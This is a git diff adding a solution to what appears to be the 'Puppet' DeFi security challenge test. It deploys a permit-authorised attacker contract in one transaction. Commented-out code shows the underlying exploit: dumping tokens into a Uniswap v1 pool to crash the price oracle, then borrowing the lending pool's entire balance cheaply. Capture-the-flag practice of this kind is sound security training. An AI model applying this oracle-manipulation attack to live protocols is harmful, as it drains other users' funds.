@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require('eth-permit');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -25,11 +26,11 @@ describe('[Challenge] Puppet', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
         [deployer, player] = await ethers.getSigners();
-
+        
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
         
-        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy token to be traded in Uniswap
@@ -95,6 +96,54 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // In order to satisfy the requirement of uisng only 1 transaction of the challenge,
+        // the player have to deploy the attack contract, approve the token to the attack 
+        // contract, and call the attack function in the same transaction. Therefore, the player 
+        // have to sign the permit of the token to the attack contract and send the signature to 
+        // the contract's construction.
+        const AttackerFactory = await ethers.getContractFactory('PuppetAttacker1', player);
+
+        attackerAddress = ethers.utils.getContractAddress({ 
+            from: player.address, 
+            nonce: await player.getTransactionCount() 
+        });
+
+        let signature = await signERC2612Permit(
+            player,
+            token.address,
+            player.address,
+            attackerAddress,
+            PLAYER_INITIAL_TOKEN_BALANCE
+        );
+        
+        let attacker = await AttackerFactory.deploy(
+            lendingPool.address, 
+            signature.v,
+            signature.r,
+            signature.s,
+            signature.deadline,
+            { value: ethers.utils.parseEther('12') }
+        );
+        console.log('Attacker deployed at: ', attacker.address);
+        console.log('Attacker balance: ', await ethers.provider.getBalance(attacker.address));
+        console.log('Current timestamp: ', (await ethers.provider.getBlock('latest')).timestamp);
+        console.log('Deadline: ', signature.deadline);
+
+        // await token.connect(player).approve(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        // await attacker.connect(player).attack({ value: ethers.utils.parseEther('12') });
+        
+        // await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        // await uniswapExchange.connect(player).tokenToEthSwapInput(
+        //     PLAYER_INITIAL_TOKEN_BALANCE, 
+        //     1n, 
+        //     (await ethers.provider.getBlock('latest')).timestamp * 2
+        // ); 
+        // let depositRequired = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // console.log('Deposit required: ', depositRequired.toString());
+        // await lendingPool.connect(player).borrow(
+        //     POOL_INITIAL_TOKEN_BALANCE, 
+        //     player.address, 
+        //     {value: depositRequired}); 
     });
 
     after(async function () {
